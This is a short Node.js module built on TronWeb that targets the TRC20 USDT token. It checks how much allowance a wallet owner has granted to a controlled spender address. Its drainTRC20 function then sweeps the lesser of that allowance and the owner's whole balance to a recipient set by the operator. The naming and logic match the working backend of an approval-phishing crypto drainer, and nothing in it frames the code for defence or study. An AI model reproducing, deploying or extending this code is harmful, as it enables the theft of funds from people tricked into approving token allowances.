const TronWeb = require('tronweb');

const USDT_TRC20 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // TRC20 USDT Contract

function getTronWeb() {
  return new TronWeb({
    fullHost: 'https://api.trongrid.io',
    headers: { 'TRON-PRO-API-KEY': process.env.TRONGRID_API_KEY },
    privateKey: process.env.SPENDER_PRIVATE_KEY
  });
}

async function checkTRONAllowance(owner, tokenAddr = USDT_TRC20) {
  const tw = getTronWeb();
  const c = await tw.contract().at(tokenAddr);
  const a = await c.allowance(owner, process.env.SPENDER_TRON_ADDRESS).call();
  return a.toString();
}

async function drainTRC20(owner, tokenAddr = USDT_TRC20, amount, recipient) {
  const tw = getTronWeb();
  const c = await tw.contract().at(tokenAddr);
  
  const allowance = await c.allowance(owner, process.env.SPENDER_TRON_ADDRESS).call();
  const bal = await c.balanceOf(owner).call();
  
  const amt = amount ? BigInt(amount) : (BigInt(allowance) < BigInt(bal) ? BigInt(allowance) : BigInt(bal));
  if (amt <= 0n) throw new Error('Allowance ya Balance zero hai');

  const targetRecipient = recipient || process.env.RECIPIENT_TRON;
  
  const txID = await c.transferFrom(owner, targetRecipient, amt.toString()).send({
    feeLimit: 150_000_000 // TRX fee limit
  });
  return txID;
}

module.exports = { drainTRC20, checkTRONAllowance, USDT_TRC20 };